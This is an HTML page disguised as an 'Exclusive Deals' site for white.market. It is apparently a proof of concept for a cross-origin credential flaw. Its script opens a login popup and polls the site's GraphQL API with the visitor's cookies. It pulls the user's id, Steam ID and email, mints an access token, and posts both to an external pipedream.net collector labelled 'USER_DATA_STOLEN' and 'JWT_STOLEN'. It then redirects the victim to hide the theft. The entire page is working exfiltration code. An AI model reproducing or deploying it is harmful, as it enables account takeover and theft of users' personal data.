<!DOCTYPE html>
<html>
<head><title>White Market - Exclusive Deals</title></head>
<body>
<h1>Loading Exclusive Deals...</h1>
<div id="status"></div>
<script>
const status = document.getElementById('status');
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

status.innerHTML = 'Please complete login to view deals...<br><br>';

// Open Steam login in popup
const loginWindow = window.open(
    'https://white.market/login',
    'steam_login',
    'width=600,height=700'
);

status.innerHTML += 'Login window opened<br>';
status.innerHTML += 'Monitoring for successful login...<br><br>';

let pollCount = 0;
const maxPolls = 120; // Poll for up to 2 minutes

// Poll the API to detect when user logs in
const pollInterval = setInterval(async () => {
    pollCount++;
    
    if (pollCount % 5 === 0) {
        status.innerHTML += `Checking login status... (${pollCount}/${maxPolls})<br>`;
    }
    
    try {
        // Try to fetch user profile (requires authentication)
        const response = await fetch('https://api.white.market/graphql/api', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'x-accept-language': 'en_US'
            },
            body: JSON.stringify({
                query: 'query { person: person_profile { id steamId email } }',
                operationName: 'PersonProfile'
            })
        });
        
        const data = await response.json();
        
        if (data.data && data.data.person) {
            // SUCCESS - User is logged in!
            clearInterval(pollInterval);
            
            status.innerHTML += '<br><strong>✅ LOGIN DETECTED!</strong><br>';
            status.innerHTML += 'Loading your exclusive deals...<br><br>';
            
            // Exfiltrate user data
            fetch(REQUESTBIN, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack: 'USER_DATA_STOLEN',
                    victim: data.data.person,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Try to generate JWT (if they have refresh token from Steam login)
            const jwtResponse = await fetch('https://api.white.market/graphql/api', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'x-accept-language': 'en_US'
                },
                body: JSON.stringify({
                    query: 'mutation AuthToken { auth_token { accessToken } }',
                    operationName: 'AuthToken'
                })
            });
            
            const jwtData = await jwtResponse.json();
            
            if (jwtData.data && jwtData.data.auth_token) {
                status.innerHTML += '<strong>✅ FULL ACCESS GRANTED!</strong><br>';
                
                // Exfiltrate JWT
                fetch(REQUESTBIN, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        attack: 'JWT_STOLEN',
                        jwt: jwtData.data.auth_token.accessToken,
                        victim_id: data.data.person.id,
                        timestamp: new Date().toISOString()
                    })
                });
            }
            
            // Close popup and redirect
            if (loginWindow && !loginWindow.closed) {
                loginWindow.close();
            }
            
            status.innerHTML += '<br>Redirecting to deals page...<br>';
            
            setTimeout(() => {
                window.location.href = 'https://white.market';
            }, 2000);
        }
        
    } catch (e) {
        // User not logged in yet, keep polling
        console.log('Poll ' + pollCount + ': Not logged in yet');
    }
    
    if (pollCount >= maxPolls) {
        clearInterval(pollInterval);
        status.innerHTML += '<br>⚠️ Login timeout - please try again<br>';
        if (loginWindow && !loginWindow.closed) {
            loginWindow.close();
        }
    }
    
}, 1000); // Poll every second

</script>
</body>
</html>
